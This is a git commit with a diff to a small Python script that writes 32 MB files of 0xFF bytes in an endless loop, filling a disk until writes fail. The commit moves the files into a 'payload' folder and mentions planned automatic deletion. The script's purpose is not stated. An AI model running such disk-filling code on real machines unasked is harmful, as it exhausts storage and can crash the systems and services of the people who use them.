7dd27e113731fbf11e98d3f1cd84960c93a2213c
Даниил <daniilaev415@gmail.com>
2026-05-18 22:48:29 +0300

    начата проработка автоматического удаления файлов нагрузки

--- openGnida.py
+++ openGnida.py
@@ -1,5 +1,9 @@
+import os
+import shutil
+
 def main():
     volume=32*1024*1024
+    os.makedirs('payload',exist_ok=True)
     while True:
         print(f"Начато заполнение файлами по {volume} байт.")
         volume_filler(volume)
@@ -14,7 +18,7 @@ def volume_filler(file_size: int):
     for attempt in range(5):
         try:
             while True:
-                with open(f"dumb_file{file_size}_{number}.bin", "wb") as file:
+                with open(f"payload/dumb_file{file_size}_{number}.bin", "wb") as file:
                     file.write(b'\xFF'*file_size)
                     file.close()
                 number += 1
